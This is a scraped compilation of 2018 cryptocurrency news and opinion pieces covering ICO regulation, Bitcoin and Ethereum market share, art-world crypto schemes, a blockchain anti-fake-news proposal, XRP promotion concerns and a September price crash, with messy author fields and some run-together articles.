According to a report by EY last year, while many legitimate sources also use ICOs, many projects are often guilty of trying, with questionable ethical intent, to attract investors to help “introduce Blockchain in new markets” via white papers containing clichés aimed at attracting inexperienced investors. These investors often have no reasonable justification for Blockchain use, besides jumping on a bandwagon, and are easily influenced by buzzwords. These investors are also particularly vulnerable to criminality, as of the nearly $4 billion raised since mid-2015 via this financing method, as much as 10% – or $1.5 million a month – of issued tokens are estimated to end up in the hands of hackers.

If the ICO industry is to continue its meteoric rise it will need to address these concerns. On the evidence of markets where regulation has become more binding for the practice, such binding mechanisms have boosted rather than inhibited ICO growth, and so it is likely there will be more to come from governments across the world looking to provide a safe and reliable destination for ICOs and their investors.

2018-09-18 00:00:00+00:00	Ethereum technology could slice bitcoin’s market cap in half, says tech analyst	['Aaron Hankin']	"The cryptocurrency that supports the ethereum network, the worlds most popular blockchain for new crypto ventures, could scoop up to half of bitcoin’s market share within five years, according to one tech analyst.

Despite losing close to 90% of its value peak-to-trough, Ian McLeod, analyst for Thomas Crown Art, an art agency that uses the ethereum blockchain to protect against nefarious activity in the art industry, said the recent plummet in the price of Ether has bottomed, and as the utility of the immutable ledger grows, its price will make a rapid reversal.

“Not only do we think it will rebound considerably before the end of 2018, I believe that over the longer time it will significantly dent bitcoin’s dominance,” wrote McLeod in an email to MarketWatch. “In fact, I think we can expect bitcoin to lose 50 percent of its cryptocurrency market share to ethereum, its nearest rival, within five years.”

Read:Are cash-strapped ICOs behind Ether’s underperformance?

That may be a bold claim to some, given the current plight of Ether ETHUSD, -1.85% , which has fallen from close to $1,500 to below $200 in less than 12 months, taking its share of all cryptocurrencies below 10% for the first time in 2018. Furthermore, the recent demise of the second-largest digital currency saw the number of people betting that prices would fall further in value hit a record in early September.

Cryptocurrency market share CoinMarketCap

However, citing the utility of the smart contract-based platform at his own company, McLeod said ethereum offers more than bitcoin, BTCUSD, -0.64% the world’s largest digital currency and preeminent protocol. “It has allowed us to create a system to use artworks as a literal store of value. It also solves authenticity and provenance issues—essential in the world of art. All our works of art are logged on the ethereum’s blockchain with a unique ‘smART’ contract” he said.

“Unless bitcoin does more now to tackle scalability issues, and improves the technology it runs on, we cannot see how it can catch up with ethereum over the next five years or so, when the crypto market will be even more mainstream.”

Read:A team at Northwestern think they have solved one of bitcoin’s biggest problems

However, scalability and technology issues aren’t foreign to the ethereum blockchain. The network is currently proposing a change of protocol from proof-of-work to proof-of-stake, which developers hope will reduce congestion on the blockchain and increase processing times, which stands at around 15 transactions a second, marginally faster than bitcoin, which can process three to five transactions per second.

A proof-of-stake protocol is where miners, or those looking to verify transactions, lock up some of their coins as stake if they validate transactions, which differs from proof-of-work system, which requires a larger amount of computing power expended.

Yet, McLeod believes the technology issues facing ethereum are nothing compared with the problems bitcoin face going forward. “Ethereum is already light years ahead of bitcoin in everything but price—and this gap will become increasingly apparent as more and more investors jump into crypto.”"
2018-09-12 15:58:09+00:00	How Much Can Be Read Into Bitcoin Dominance in Such a Bear Market?	['About The Author', 'Darryn Pollock']	"Bitcoin may be down in the dumps pricewise, but it is right up there when it comes to market dominance, is there something to read into?

Bitcoin’s market share dominance has now reached 57.8 percent for the first time since Dec. 16, 2017. That was the day before Bitcoin peaked at $20,000. Of course, it is a very different state of affairs in the cryptocurrency market these days.

Bitcoin is in a severe bear market, its price sits around $6,200 and is slowly dropping, yet its overall dominance is still on the rise. In December, the market dominance probably had a lot to do with adoption and hype, whereas this time around, it may have a lot more to do with the woes of altcoins.

Ethereum has been particularly hit hard with its dominance down to around 12 percent. This loss of dominance has also affected the second-biggest cryptocurrency as its price flounders under $175.

However, in the grand scheme of things, could this downfall in dominance from the altcoins out there actually be a blessing in disguise for the Bitcoin market and the cryptocurrency ecosystem?

There are new coins being born every day, many of them scams or poor projects, and a lot of them ultimately end up as failures. However, if the indication is that the money in crypto is filtering towards a proven cryptocurrency like Bitcoin, and away from the hundreds of others, it may be a good reboot to the system.

End of the get-rich-quicks

One aspect of the cryptocurrency space that has emerged and given it a bad rep is the multitude of poor ICOs and cryptocurrencies that often don’t deliver or fail outright. These reached a pinnacle towards the end of last year and made for quite a big ‘altcoins season.’

That is not to say that the dilution of Bitcoin’s dominance meant that money was being poured into bad, or scam, coins, in fact, the majority of the dilution would have still gone towards major coins in the top 10, such as Ethereum.

However, this latest show of dominance from Bitcoin seems to be indicating that the focus in the cryptocurrency market- even if it is diluted- is being aimed squarely at the major cryptocurrency that has proven itself.

Bitcoin vs. Ethereum

What is interesting to compare is the long rivalry that has developed between Bitcoin and Ethereum, despite the two coins being so fundamentally different. They typically have always occupied first and second spot on the market cap, and are the two most well known.

Last year, in June, was Bitcoin’s weakest market position with Ethereum taking 30.63 percent of the market, just under seven percent shy of Bitcoin’s at 37.87 percent.

Since then, Bitcoin has been able to regain market dominance, hitting a high of 65.18 percent in December 2017. Ethereum was at a low there too- 9.71 percent. But, Ethereum was able to close the gap on in February, grabbing 20.46 percent to Bitcoin’s 36.32 percent, as a real altcoin season was in play.

So, with Bitcoin highly dominant, and Ethereum struggling in dominance, but as well as price, what can be read into the situation for the future. Predictors are all out there worrying about the next price rally, but perhaps this is a good situation for the market to shake itself clean.

What about the ICO sell off?

Many are speculating that the dire position Ethereum finds itself in is because ICOs have sold their holding, but in fact, this is not entirely true, and their actions would have minimal effect of Ethereum’s price.

The majority of major Blockchain projects based on Ethereum are still holding tens of millions of dollars in their Ethereum treasury, according to a major research group. However, if that bearish market continues, the sell pressure could be too much and it may trigger a sell off.

Still, as it stands, Ethereum’s own issues are not to do with ICOs selling their assets, but rather it could loop back to the general market sentiment. Bitcoin is still holding strong in other places other than its price, yet other coins are facing a lot more difficulties, and a lot less trust or enthusiasm.

A full shake out

There is no doubting that the scams, false projects, and Blockchain hype led to an ecosystem full of bad options which were fueled by speculation and hype about astronomical growth. But now with the end of hyper growth, and a much more cautious marketplace, perhaps the chaff has been shaken out."
2018-09-19 06:19:50+00:00	The Romance Between the Art Market and Cryptocurrencies Is Getting Weirder Every Day. It Won’t End Well.	['Ben Davis', 'Https', 'News.Artnet.Com App News-Upload', 'National Art Critic']	"It’s worth marking this cultural moment. I, for one, have never seen anything like it. I refer to the utter flood of art-and-cryptocurrency schemes, multiplying like some kind of demonic computer virus.

There have been weeks when I’ve received a new pitch for some new project every day. It’s as if some other-dimensional portal opened up at exactly the point on the Venn diagram where the art bubble meets the tech bubble.

A frenzy that intense means something, so you should pay attention—though also don’t take your eyes off of your wallet. (My colleague Tim Schneider has done yeoman’s work tracking the market implications of this hyperkinetic vogue.)

I don’t deny that there is potential good along with the bad amid this Cambrian explosion of activity. I’m not going to argue that there cannot be worthy applications.

Last year, Bail Bloc, an artist-led scheme to get users to install a program that mines Monero, a digital currency, and funnel the earnings to help bail out low-income people in the Bronx who have been accused of misdemeanors, got some attention.

I have to admit, I remain skeptical of yoking social justice to anything so speculative and opaque. But if all Bail Bloc did was leverage the hype around cryptocurrency to raise attention for the Bronx Freedom Fund, it did something good.

Thus far Bail Bloc has raised a little more than $6,000. Which means that the investment it has generated is not even a rounding error amid the thunderous shockwave of hot money pouring into the crypto-art space. If you want to see the typical effects the craze is having on art, you have to look elsewhere.

And there, the credulous boosterism alarms me. Art is certainly not the only field, faced with shaky or crumbling infrastructure, looking to tap society’s latest speculative tech bubble as a Hail Mary to save itself—but given that it is already characterized by desperately asymmetric odds, endemic secrecy, allergy to regulation, money-for-nothing fantasies, obsession with novelty, and pretentious naiveté, it is one particularly suited to letting cryptocurrency mania run amok.

Most tellingly to me, art’s sudden infatuation has exploded exactly amid an epic cryptocurrency meltdown. It’s hard not to imagine that the art world is, on some level, serving this market as a supplier of Greater Fools.

There are too many outlandish stories out there to count. Here, I’ll only catalogue for posterity a few items that cropped up in just the last weeks that strike me as important for marking a moment that is weird and getting weirder.

Exhibit A: CryptoKitties Get the Museum Treatment

What, you ask, are CryptoKitties? Well, if you want to find out, you can now fly to Karlsruhle, where the ZKM Center for Art and Media is including them in “Open Codes: Living in Digital Worlds,” alongside the likes of tech-art hotshots like Cerith Wyn Evans and Simon Denny.

In a nutshell, they are part of an emerging genre of digital object known as “cryptocollectibles,” built atop the Ethereum network—unique, tradable digital objects (or, in the hideous jargon of the space, “nonfungible tokens”).

Essentially, you purchase, with your hard-earned Ether, a unique image of a cartoon cat that you can then either sell or “breed” with other unique cat images to create new cat images that you can also sell. It’s an application whose main virtue is that it is a) wacky enough to get media attention, and b) a thing you can buy with Ether, which is otherwise hard to spend.

The Kitties themselves, as one crypto-investing professional told Planet Money recently, likely have the long-term value of investing in “Beanie Babies, or your friend’s art.” Interest in the novelty spiked last year, to such a point that CryptoKitty trading actually slowed the Ethereum network—and then quickly tanked, down 90-plus percent from its December high last year, where it remains, to the woe of anyone who took them too seriously.

And so, the brains behind CryptoKitties have been trying to reanimate interest. This campaign includes the glorious “In A KittyVerse Far, Far Away…,” a sponsored-content teaser for the cutesy cryptocollectibles seemingly aimed at children, posted to the blockchain-focused art site the Creative Crypto (“Mama Meow and Papa Paw cuddled around a little Kitty Crib, admiring the newly minted egg that the Ethereum Blockchain had blessed them with…”)

The Kitties’ celebration at a German museum—billed as coming “from the mind of Guile Gaspar,” CryptoKitties art director—must be viewed as another way of sustaining the hype as well, using art’s apparatus of prestige.

As should its highly promoted participation in a charity auction in May, where a CryptoKitty-encrusted artwork, also by Gaspar (aka Guilherme Twardowski), sold for $140,000 via LiveAuctioneers to one Igor Barinov, an Ethereum developer himself.

Art industry people have been wondering what art could do to entice the elusive “tech collector” for a long time. It turns out the answer may be something that combines the pleasures of Pokemon with the joys of throwing your money in the trash.

You’d be just about tempted to sigh and say, “Let them lose their money,” except…

Exhibit B: Ethereum Goes to Art School

This press release comes across my desk: “SF art collective Will Brown’s experiment with cryptocurrency.” For the show, titled “Will Brown: Ether,” the collective (composed of Lindsey White, Jordan Stein, and David Kasprzak) is staging an installation at the San Francisco Art Institute’s galleries that consists of taking the exhibition budget for their show and investing it in Ethereum, chosen “based on the poetic character of its disembodied and atmospheric name.”

This is meant as a kind of social-practice gesture—or even as a rallying cry: “Will Brown will withdraw profits above the initial investment and direct them into a student or faculty project,” the press release says. “This gesture reflects Will Brown’s conviction that collective, creative action affords the greatest odds for art education to adapt and endure.”

This assumes that there will be profits. Ethereum has been on the opposite of a tear lately. It could well be that, instead of helping the good students and faculty of SFAI, Will Brown will have effectively torched a pile of money in front of their faces.

“This gesture reflects our concern for the management and stability of an iconic institution at a particularly challenging moment in its history,” Will Brown writes. They compare the gesture to SFAI’s 1986 sale of Eadweard Muybridge works in order to fund itself—but that comparison is way, way too flattering.

Muybridge’s works were 100 years old at the time of their sale and firmly ensconced as foundational works in photo history. Ethereum, on the other hand… well, I don’t see much difference between framing the act of investing in Ethereum as a “collective action” and feeding your money into a slot machine, pulling the lever, and calling it the return of May ’68.

The slot machine idea might actually be better. At least there the rules are relatively simple to grasp.

True, the money at stake here is small change—but that’s also why I’m bringing it up. It reflects how the hype is penetrating to places where not just the stupid-rich are going to get hurt. My question is: Is it really a good idea to explicitly present crypto-investing as a solution for cash-strapped art-school denizens?

Because students actually are being lured by crypto’s get-rich hype. Here’s what one student told Vice last year in an article called “I Invested All My Spending Money in Ethereum (And So Did My Friends),” almost exactly mirroring the pitch for the Will Brown project:

Young Americans live in a society that fosters endless ambition, but student debt, rising rent costs, and wages that haven’t significantly grown in decades all make for a relatively bleak financial outlook. Who knows what my ethereum investment will look like in five years. It might balloon into the seed money I need for a brazen startup venture. Or it could be just another one of my stupid ideas. I’m not sure, but I guess we’ll see.

I can’t think of a more despairing symbol of the warped incentives and broken state of the society we live in than that statement. Or rather, I couldn’t, until I read…

Exhibit C: John McAfee Is Launching an Art Residency

Here’s @officialmcafee’s Tweet:

This incredible opportunity is open to artists working in all media, though it will focus thematically on “revealing the Crypto Space through art.”

I mean, what to say here? You can’t make this stuff up. McAfee, if you do not know, may be synonymous with anti-virus software, but lately he has reinvented himself as a hyperbolic champion of all things crypto.

And if you wonder why he had to “reinvent” himself, well, go ahead and check out Nanette Burstein’s documentary Gringo: The Dangerous Life of John McAfee on Showtime (or Netflix) before you apply for that “Crypto Art Program.”

Burstein digs into allegations that, while building his own Colonel Kurtz-esque empire in Belize after the financial crisis, McAfee degenerated into paranoia, hiring gang members, terrorizing (and possibly worse) a biologist who worked for him, and allegedly having a neighbor tortured and assassinated.

Now, who knows what really happened. McAfee has engaged in some vigorous attempts to debunk the film. A number of the witnesses from Belize have recanted their statements. Burstein, in turn, claims that McAfee has paid them to do so. Showtime stands behind the film. So you be the judge.

As for me, you couldn’t pay me to spent a month at the McAfee Crypto Art Program. Which is funny, because he is not even paying.

Reporting on the residency, Glasstire flags a follow-up communique, in which, challenged that he should provide a stipend for his artist-in-residence, McAfee replies with characteristic übermensch brio:

You are wrong, my friend. History proves that the reverse is true in all of the arts. Art created for free is, universally, superior to paid commissions. The statue of David, every painting of Van Gogh, the entire body of work from heironimous [sic] Bosch, M.C. Escher et. al. All free.

For the record, Florence’s Guild of Wool Merchants paid Michelangelo 400 florins to create the David—but that’s probably overthinking things.

If some conceptual artist were to concoct a satirical media stunt whose lesson was supposed to be “the crypto-art space is for dupes or scoundrels—so watch out,” it would be less perfectly illustrative than this real-life bit of news.

Look, the underlying technology, whatever cryptocurrency’s fluctuations, is probably here to stay. Interesting art or art-ish things will spring from it. Maybe. It’s just that our particular society is set up so that no progress is ever made without inflicting the maximum amount of waste and damage.

The promise of cryptocurrency is supposed to be some kind of libertarian decentralization and a new level of error-proof accuracy in online transactions. Ironic, then, that in practice its scene has proven a haven for fast-talking megalomaniacs to build kingdoms and for wild post-truth hype to flourish.

Given everything you know about art, which of the two halves of this equation do you think really explain the particular fascination for cryptocurrency, beneath it all? You can’t be critical enough.

2018-09-25 10:04:28+00:00	How can Blockchain solve the fake news problem.	['Akash Takyar']	"“Combating fake news and reaching to its origin”

In today’s century, when someone shows us the news, video or pictures of any event, how can we believe its authenticity? It seems that the public is losing their trust in media due to the lack of reliable reference of facts.

The beginning of the 21st century set the premise for today’s disruptive digital economy, where producing and exhibiting digital content has become convenient and easy. Digital content in the form of images, videos or blogs is being created and published at large scales today.

The free access to create and share information on social media platforms like Facebook, Instagram and other digital platforms has popped out a new problem of fake information, which created rumors around the world. And with advances in technologies like AI, digital animations and social engineering, the line between fake and authentic content is only going to blur even more.

No one who has time to check the authenticity of messages or videos forwarded on the WhatsApp or other social media platforms. That’s how people fall into the trap for the fake news. Therefore, it has become essential to reach out the authenticity of the information, i.e., where it has come from and who created it.

With traceable and transparent nature of the blockchain, it can be possible to verify the authenticity of the information or its sources and build trust in news displayed on the Internet. The blockchain in news industry enables the content to be produced and distributed over the internet in an immutable and secure way.

What is fake news?

Information which has no fact behind it but presented factually accurate and consumed by millions through television, radio, websites or social media is defined as the fake news.

The hoaxes or false stories can destroy the reputation of any human or industries including politics, health, stock, sports and finance.

For example, in 2016, BuzzFeed News classified the most viral fake news on Facebook was “Obama had signed an executive order while banning the pledge of allegiance in schools nationwide.”

The content was intended to destroy the Obama’s position during the 2016 US elections.

The false stories are not just limited to politics, but can also affect other areas like health, vacation, and business.

It is not easy to recognize a fake news, since there are several types of content around, such as:

Satire or Parody – When the fake stories are posted on the sites just for entertainment but have no potential to deceive people. False connection – When news content is not relevant to its headlines, captions, or visuals. False context – When relevant content is shared in the wrong context. Imposter content – When the actual sources are mimic with fake or manipulated sources. Fabricated content – When news is created to either earn money or gain publicity.

Here are some of the real-life cases:

One of the significant concerns about fake news is manipulation. The fabricated content can fool society, especially during political events.

In 2017, during the Jakarta Gubernatorial Election, more than 1,000 reports on politics and election were declared as fake.

The event spreads ‘fake news’ about Anies Baswedan who was the opposition candidate, that his loss in elections would give rise to a Muslim Revolution.

The event spreads ‘fake news’ about Anies Baswedan who was the opposition candidate, that his loss in elections would give rise to a Muslim Revolution. Fake news can affect the nation as well as international relations. In 2017, Qatar’s state news agency declared that its Twitter account had been hacked and hackers published hoax comments to criticize aspects of the Arab Gulf and US foreign policy towards Iran.

Due to the false comments, neighboring countries like Bahrain, the United Arab Emirates, Saudi Arabia and Egypt broke diplomatic ties with Qatar.

Due to the false comments, neighboring countries like Bahrain, the United Arab Emirates, Saudi Arabia and Egypt broke diplomatic ties with Qatar. Fake scandals often look more convincing than the fact, leading to harassment, racism and reputation damage. Buzzfeed published the news claiming that the jewellery shop in the US replaced real diamonds with fake ones. The story makes the brand’s stock fall by 3.7% and reputation got damaged along with the business loss.

The blockchain based solution has the potential to change the way information is produced and disseminated while playing the major role to tackle disinformation over the longer term. Let’s understand how the blockchain technology could combat fake news.

Blockchain in Fake News

How can Blockchain solve the problem of fake news?

Blockchain technology is declared to be the emerging technologies to revolutionize the way information is produced and disseminated.

Due to the traceability, transparency and decentralization nature of the blockchain, the problem of fake news can be handled effectively.

The blockchain enabled platform can provide online readers with a reliable way of verifying the content and its source.

User personas involved in Blockchain based fake news platform:

News Agencies – Who will provide news to the editors/publishers/journalists for publishing. Journalists – Who will upload the images or video on the platform. Modifiers or Editors – Who will write, modify and publish the news on the platform. Crowd Auditors – Who will approve or mark news item as spam by scanning the QR barcode on it.

Front-end components:

Native Mobile application for crowd auditors and journalists. Web portal for news agencies, modifiers or editors.

Backend Technology:

Blockchain component Microservices Programmed using Node.js IPFS (Interplanetary Filesystem), used to store data in the distributed database.

The blockchain enabled platform can be used to verify any information regarding live news events, viral images and content moderation.

Let’s read how different user personas could use the blockchain based news application:

News agencies:

Using blockchain connected applications, authorized news agencies can create their profiles and upload necessary documents such as:

Name News agency license Address proof Domain name Work permit Years of working certificates

The documents given by the news agencies would be saved in the IPFS, with the address hashed and stored on the Blockchain.

Once news agencies sign up to the platform, they can distribute the news amongst writers, bloggers and publishers and save the content on the blockchain.

When the editors/modifiers/publishers receive the content from agencies, they can check the source of the news and decide whether to publish it or not.

Modifier or Editor create profile:

Modifiers or editors or writers sign up to blockchain enabled platform with the necessary details like:

Name Contact number Email Id Designation News industry license Work experiences and certifications

The documents provided by the modifiers or editors to register on the platform will be saved in IPFS with a hash address stored to the blockchain.

When the modifier/editor uploads their KYC documents, their background verification is done via third-party APIs like Trullio.

The profiles are diligently checked to ensure if they have worked with the journalism industry and are authorized to publish the news story.

Based on the details accumulated from the uploaded documents, smart contracts would trigger the rules to provide ratings to the modifiers or editors.

Rating would help crowd auditors to decide whether the news written by him/her is fake or not.

After signing up to the platform successfully, the modifiers or editors can publish the content. The content and its hash address would be saved on the blockchain.

Since news content are moved on an immutable ledger, blockchain can make it impossible for anyone to alter the information.

For example, when Alex writes, modifies or saves any news content on the platform, smart contracts would trigger and store the content and its hash address to the blockchain.

The hash address can be the signature of the document which will define who has created it from where and when.

Journalist’s profile creation:

Journalists would also have to sign up to the platform with necessary details like name, email address, phone number, id proof and work license.

Similarly, when the journalists uploads their KYC documents, third-party APIs like Trullio will do their background verification.

Regulations built in the Smart Contracts would help to generate the ratings of the journalist’s based on the documents submitted by them.

After signing up to the platform, journalists can upload/publish image or video and smart contracts would trigger to save the image/video and its source to the blockchain.

Whenever journalist edits or modifies any image or video, then the item and its hash would be saved to the blockchain. Changes made to the item help them to identify whether the image/video is real, edited or reused.

Since the start, all the edition with the images or video would be visible to everyone connected on the Blockchain network.

As the images or videos saved on the Blockchain, it is impossible to delete or alter the data.

The blockchain enabled application can generate traceability at the time of the creation of the content, image or video.

Role of the Crowd Auditors:

Crowd Auditors can be the community different from the news organization. They can have the ability to decide whether the published or viral news is fake or not by tracing its source.

Crowd Auditors can register to the platform with the necessary KYC documents and other essential information.

After background verification from the third party’s API, crowd auditors is onboard to the blockchain enabled application.

How can Crowd auditors trace the news source and validate it?

Every news item has the QR code that can help crowd auditors to find the complete source of that particular news item.

The QR code helps to find the complete news details like when it was created, edited, modified, written and published.

Therefore, whether it is an image, video or content, scanning the QR code can help auditors to mark it as real or fake.

Once the news gets verified, the smart contracts get triggered to save the verification status on the blockchain.

Let’s understand how crowd auditors can decide to mark the news as spam and receive rewards on the blockchain.

Crowd Auditors can randomly or periodically rate content and vote them as accurate or inaccurate.

Here, are the factors by which crowd auditors can evaluate the content’s credibility:

Check the site – Well, it is not necessary that the popular site publishes the actual content only. So, the crowd auditors can investigate the site, its mission and published content to mark it as accurate or inaccurate.

Consider the source – Crowd Auditors can check the site’s domain to verify whether it is a legitimate news organization or not. Since some domains like “abcnews.com.co” may be created to look similar to the original, but they are not.

Check the author – Do a quick research on the Author. Author’s details have already been stored on the distributed ledger, which is visible to all crowd members of the network. Based on the details provided by Author can help crowd auditors to evaluate the creditworthiness of them.

Blockchain enabled news platform could have the following benefits:

Transparency in the news : As the blockchain can provide transparency, the world would be able to discover the news is fake or not. The authenticity of the news will be based on specific criteria defined in the smart contracts, generating trust and transparency amongst the whole world.

Sagar Sarbhai is not a household name. Not even a cryptocurrency name. As Head of Regulatory Relations for Asia-Pacific and the Middle East, his role at Ripple Labs is senior enough to merit attention, but not C-level stuff.

In an interview with CNBC he dropped a clanger: “I am very confident that in the next one month or so you will see some good news coming in where we launch the product live in production,” he said, regarding xRapid.

xRapid is a product that Ripple Labs says will reduce costs and offer on-demand liquidity for banks – and it will use the cryptocurrency token they developed, XRP, as an intermediary asset. Banks could still use Ripple’s xCurrent product however, which does not depend on XRP.

Following this hint, a spokesperson at Ripple Labs said there isn’t an official commercial timeline for the release of the product.

As the editor of a news publication, a good portion of my day is spent glancing around my array of monitors. Through a process of osmosis, the comings and goings of the crypto world ooze their way into my consciousness – and although I may not be great at predicting green candles, I’m pretty good with red flags.

For the last week or so, I’ve seen story after story after story appear in certain crypto media that are known to accept paid contributions. These stories have three things in common: they are uniformly positive about XRP prospects, they offer no context or alternative perspective, and they are upvoted immediately in a pattern inconsistent with other stories.

Positive stories about Bitcoin may see a few thumbs-up. Dogecoin’s recent rise got a little attention. But throw in a ridiculous headline like “Is XRP Considered To Be The Next Bitcoin?” and the news aggregators light up like a Christmas tree.

While Ripple Labs itself may have nothing whatsoever to do with planting stories or encouraging bot-driven sentiment, the plethora of media that will accept paid stories unquestioningly – and inject them directly into a newsfeed that’s carried by major crypto resources – must surely influence investor confidence. And for as little as $299, any investor with a bag of XRP and a keyboard could help move the market.

When Crypto Briefing’s Andrew Macdonald wrote a critique of XRP last week, he was banned from the Ripple Telegram group for sharing it. When I shared that post on the Ripple subreddit, I was immediately banned for 30 days. The article was a scholarly and intelligent assessment of the steps that Ripple Labs has taken to distance themselves from the XRP token – in all likelihood, with the intention of helping the token avoid being designated a security by the SEC.

Cryptocurrency isn’t completely divorced from reality. When negative sentiment is suppressed, and positive sentiment is boosted in a way that makes no sense, the red flags fly high.

There is an alternative explanation for the XRP token’s Flippening: there’s already a deal in place with the SEC, to group the token in with ETH and BTC as an asset that has ‘become decentralized’ enough to merit escaping designation as a security.

In which case, as is so often the case, someone simply knows something we don’t – and they’re going make a killing.

Whether XRP deserves its current market capitalization or not, one thing I am sure of: I will never hold a token which needs censorship and an army of boosters to sustain its price.

The author is not invested in XRP but holds other digital assets.

Cryptocurrency markets are showing no signs of recovery after a spectacular price crash caused bitcoin to lose almost $1,000 of its value in the space of just 24 hours.

Even bigger losses were felt by bitcoin's rivals, including ethereum, ripple and bitcoin cash, as cryptocurrency analysts struggle to explain the sudden downturn.

One popular theory among market analysts is that the price crash was a result of Goldman Sachs abandoning plans to launch a cryptocurrency trading desk. However, some suggest that this might not tell the whole story.

“Most people will assume the price correction is a result of Goldman Sachs announcing it won’t be opening a cryptocurrency trading desk this year,"" Phillip Nunn, chief executive officer at Wealth Chain Capital, told The Independent.

""Although this is likely to be a contributing factor, I believe that the real reason is that since the advent of bitcoin futures in early 2018, we are now seeing massive market manipulation and suppression by whales and experienced futures traders.""

The lack of market regulation means that a powerful group of traders is able to act with impunity, said David Drake, founder and chairman at LDJ Capital.

He told The Independent that he expected the downward trend to continue until a bitcoin exchange traded fund (ETF) was introduced by a regulator like the US Securities and Exchange Commission.

""Right now there are no rules on manipulations and with groups/people manipulating the markets are doing so because they can without fear of consequence,"" he said. ""Hopefully, that will change with the SEC and FINRA supervision over the next year.""

The price of bitcoin plummeted by several hundred dollars on Wednesday morning, triggering a market-wide crash for cryptocurrencies (CoinMarketCap)

Other experts have pointed to the fact that trading volumes increased despite the price dropping, suggesting a mass sell-off.

According to Shidan Gouran, CEO of Global Blockchain Technologies Corp, this could be because the one-year anniversary of bitcoin's 2017 boom is approaching. This means some of the early investors may be wanting to sell their holdings while they are still ahead.

""Many investors are possibly cashing out as a combined result of impatience and a desire to break even"" Mr Gouran told The Independent. ""Also, with many of bitcoin’s investors being young adults, it is possible that a good percentage of them are in college, and the beginning of the school year prompted a need for cash – thus forcing them to sell some of their bitcoin.""

Another possible explanation for the price crash is a bitcoin wallet that has been laying dormant since 2014. In that time, the value of its contents have risen alongside bitcoin's fortunes and it is now worth around $1 billion.

It is not clear who owns the wallet, with speculation in cryptocurrency forums suggesting that it may belong to Dread Pirate Roberts, the pseudonymous creator of the Silk Road drug market place on the dark web. Other theories claim the funds may have passed through the notorious MtGox exchange.

Whoever controls the wallet seems ready to cash in, as some of its contents are being moved onto various exchanges.

""There is now a big sell off happening which negatively impacts the price,"" Mr Isaacs said. ""This will continue to happen until the market is more established.""

Yet despite the current state of the market, Mr Isaacs remains confident about bitcoin's longer term prospects. Even its current trading price of around $6,500 – down from around $20,000 last December – is still higher than its market value at this time last year.

""Ultimately it’s a positive as larger investors and institutions are beginning to operate in cryptocurrency,"" he said. ""The market should stabilise in the run up to 2019 and I predict bitcoin will comfortably be over $10,000 by Christmas.”"

The volatility in the cryptocurrency market is actually affecting the entire market that one could imagine where the market is tending to, The past week have been an entirely high volatile Sections, with Only Bitcoin Sustaining and Resisting harsh Tumbles before Joining back the Bearish thread.

One of the Altcoins that has been affected drastically is ethereum which has lost more than 550% of its value after attaining the highest value of $1432.88 on Jan 13,2018 and is presently trading below $244 as at the time of writing.



Various market conditions have contributed to this bloody Decline

Ethereum has Experienced reduction in its trading volume, the public sentiment on ethereum could be said to be negative as traders interest in it has been Constantly reducing.

The trading volume of ethereum was more than 5 million as at the time it attained its highest value but it’s presently below 1.6 million, which shows a decline of more than 300%. This has adversely affected the price of ethereum.

Ethereum has been battling with High Volatility for some time now, Some of which are Apparently because of the movement of some major crypto tokens out of the ethereum blockchain network.

The high activities of most of the top erc20 crypto tokens within the ethereum blockchain was quite high as a result of the gas fees that was paid. However, after the movement Of Top Tokens like EOS and Tron to it’s mainnet, the activities within the ethereum blockchain has significantly reduced.

Yesterday ZyCrypto Reported On Jeremy Rubin’s Opinion About Ethereum, Where Rubin Stated that the Value Of ETH might Drop to $0 if some Major fixes are not done which vitalik also commented On and Agreed with him, Such Negative speculation about ethereum value Could Affect The Coin in a Highly Negative Approach as no strong investor could invest in a project that is good as failure."
2018-09-08 04:31:40+00:00	Bitcoin Price Crashes and Cryptocurrency Market Dips by $12 Billion	['Angeline Mbogo Displays Her Enthusiasm For Crypto', 'Blockchain Through Her Writing', 'Drive To Increase Awareness. She Is Also A Cryptocurrency Trader.', 'Please Enter Your Name Here']	"On Wednesday this week, the bitcoin price dropped by around five per cent to below $7,000 while the cryptocurrency market dipped by $12 billion on the same day. Currently, the bitcoin price stands at $6,414 as of September 8th, 2018, and seems to be on a downward trend based on CoinMarketCap stats.

Other cryptos also dipped on the same day, with Ether dropping below the $300 mark. ETH is now trading at $216.

The crash also caused the market capitalization of the crypto market to drop significantly to the current cap of $203.6B compared to a market cap of approximately $222B on Wednesday. The market cap has dropped from more than $800B in early January this year.

In August 2018, cryptocurrencies fell below $200 billion for the first time in 2018. The current drop in this market offers potential investors another opportunity to buy Bitcoin ahead of the expected rise to $20,000 at the year-end.

Despite the drop in Bitcoin’s price, the market dominance of cryptocurrency has been steadily on the rise and now stands at 54.8 percent.

Bitcoin Diamond’s Price Grows Significantly

As other cryptocurrencies were experiencing a dip on Wednesday, Bitcoin Diamond’s price grew by 110 per cent according to CoinTelegraph. The coin’s price has since been fluctuating and now stands at $1.96.

The spike could have been attributed to Binance’s decision to open deposits and withdrawals for Bitcoin Diamond(BCD). Binance is one of the largest exchanges in the world by trade volumes.

On the other hand, Bitcoin Gold’s price dropped by 4.6 percent and its price currently stands at $19.06. Bitcoin Gold(BTG) will be delisted from the crypto exchange, Bittrex, by mid this month after $18 million in the crypto was stolen in May.

Major altcoins like Ripple, Bitcoin Cash, and EOS all fell 11 per cent, 10.2 per cent, and 10.9 percent respectively. Currently, the prices of these coins stand at $0.29, $506.13, and $5.06 in that order.

The Effect

According to Bloomberg;

“Bitcoin has lost half of its value in 2018, while trading on cryptocurrency exchanges has fallen by 80 per cent.”

This drop in trading volumes has seen exchanges such as Kraken let go of 57 employees.

The bitcoin price has dropped to nearly 67 percent since December last year while cryptocurrency hedge funds are down by almost 50 per cent.

At the same time, financial services company Goldman Sachs is reportedly withdrawing its plans to create a crypto trading desk."
2018-09-18 00:00:00+00:00	Constructing a Cryptocurrency Index - Analysis & Methodology	['Anthony Xie', 'About The Author']	"Cryptocurrency Index

This blog was created by HodlBot — the world’s smartest cryptocurrency trading bot. HodlBot helps cryptocurrency investors automate portfolio creation, indexing, and rebalancing. HodlBot is currently available to users on Binance, Kraken, Bittrex, and KuCoin. It’s free to try for the first 7 days. Paid monthly subscriptions start at $3/month.

At HodlBot, we don’t make bets on individual coins. The cryptocurrency market is irrational and fundamental cryptocurrency valuations are not well understood.

Coins fall in and out of favour in a way that is hard to predict. Take XRP as an example. Despite not being a truly decentralized cryptocurrency, it shot past ETH for the #2 spot earlier this week.

?????

While we don’t have an opinion on how the market prices individual coins, we are confident that the price and value of cryptocurrencies will increase in the long run. We’re firm believers in the underlying technology.

I know that the asset class will grow, but I don’t know who the winners will be.

This is why we’re building cryptocurrency indices.
